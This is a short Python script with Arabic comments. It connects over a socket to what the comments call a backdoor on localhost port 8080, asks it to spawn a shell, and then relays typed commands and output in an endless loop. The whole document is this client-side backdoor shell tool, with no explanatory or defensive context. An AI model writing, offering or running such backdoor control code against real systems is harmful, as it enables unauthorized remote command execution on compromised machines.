import socket
import subprocess

def get_shell():
    # إنشاء كائن سوكت
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # الاتصال بالباب الخلفي
    sock.connect(("localhost", 8080))

    # إرسال أمر للباب الخلفي لتشغيل الشل
    sock.send(b"spawn_shell\n")

    # استقبال مخرجات الشل
    output = sock.recv(1024)

    # طباعة مخرجات الشل
    print(output.decode())

    # التفاعل مع الشل
    while True:
        command = input("> ")
        sock.send(command.encode() + b"\n")
        output = sock.recv(1024)
        print(output.decode())

get_shell()
